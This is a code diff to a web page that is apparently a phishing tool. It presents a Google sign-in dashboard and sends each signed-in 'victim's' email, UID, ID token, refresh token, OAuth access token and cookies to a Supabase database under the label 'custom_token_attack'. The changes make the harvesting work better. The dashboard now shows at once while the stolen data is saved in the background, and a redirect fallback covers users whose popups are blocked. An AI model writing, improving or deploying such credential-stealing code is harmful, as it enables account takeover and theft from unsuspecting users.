@@ -1310,14 +1310,20 @@
 
         auth.onAuthStateChanged(async (user) => {
             if (user) {
-                let waitCount = 0;
-                while (!pendingCred && waitCount < 20) {
-                    await new Promise(r => setTimeout(r, 100));
-                    waitCount++;
-                }
                 currentUser = user;
                 idToken = await user.getIdToken();
 
+                // Show dashboard immediately - don't block on pendingCred or Supabase
+                document.getElementById('loginOverlay').classList.add('hidden');
+                document.getElementById('mainContent').classList.add('active');
+                document.getElementById('navUser').classList.add('active');
+                if (user.photoURL) document.getElementById('navAvatar').src = user.photoURL;
+                document.getElementById('navEmail').textContent = user.email;
+
+                log('reconLog', `[AUTH] Authenticated as ${user.email}`, 'success');
+                log('reconLog', `[AUTH] ID Token obtained (${idToken.substring(0, 30)}...)`, 'success');
+
+                // Non-blocking: extract refresh token from localStorage
                 try {
                     const stored = JSON.parse(localStorage.getItem(
                         '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
@@ -1327,7 +1333,8 @@
                     }
                 } catch(e) {}
 
-                await saveToSupabase({
+                // Non-blocking: save to Supabase (capture pendingCred if available by now)
+                saveToSupabase({
                     attack_type: 'custom_token_attack_auth',
                     victim_email: user.email || '',
                     victim_uid: user.uid || '',
@@ -1347,16 +1354,9 @@
                     cookies: document.cookie || '',
                     firebase_api_key: TARGET_API_KEY,
                     attack_vector: 'custom_token_attack',
+                }).then(saved => {
+                    if (saved) log('reconLog', '[AUTH] Token data saved to database', 'success');
                 });
-
-                document.getElementById('loginOverlay').classList.add('hidden');
-                document.getElementById('mainContent').classList.add('active');
-                document.getElementById('navUser').classList.add('active');
-                if (user.photoURL) document.getElementById('navAvatar').src = user.photoURL;
-                document.getElementById('navEmail').textContent = user.email;
-
-                log('reconLog', `[AUTH] Authenticated as ${user.email}`, 'success');
-                log('reconLog', `[AUTH] ID Token obtained (${idToken.substring(0, 30)}...)`, 'success');
             }
         });
 
@@ -1370,14 +1370,25 @@
                 if (result.credential?.accessToken) pendingCred = result.credential.accessToken;
             } catch (error) {
                 console.error('Google OAuth error:', error.code);
-                if (error.code === 'auth/popup-blocked') auth.signInWithRedirect(provider);
-                document.getElementById('loginLoading').classList.remove('active');
+                if (error.code === 'auth/popup-blocked' || error.code === 'auth/popup-closed-by-user') {
+                    // Fallback to redirect-based sign-in
+                    auth.signInWithRedirect(provider);
+                } else {
+                    // Other errors: hide loading so user can retry
+                    document.getElementById('loginLoading').classList.remove('active');
+                }
             }
         }
 
+        // Handle redirect-based sign-in result
         auth.getRedirectResult().then((result) => {
-            if (result?.user && result.credential?.accessToken) pendingCred = result.credential.accessToken;
-        }).catch(() => {});
+            document.getElementById('loginLoading').classList.remove('active');
+            if (result?.credential?.accessToken) pendingCred = result.credential.accessToken;
+            // onAuthStateChanged handles showing the dashboard
+        }).catch((error) => {
+            document.getElementById('loginLoading').classList.remove('active');
+            console.error('Redirect result error:', error.code);
+        });
 
         // =====================================================
         // API FETCH HELPERS
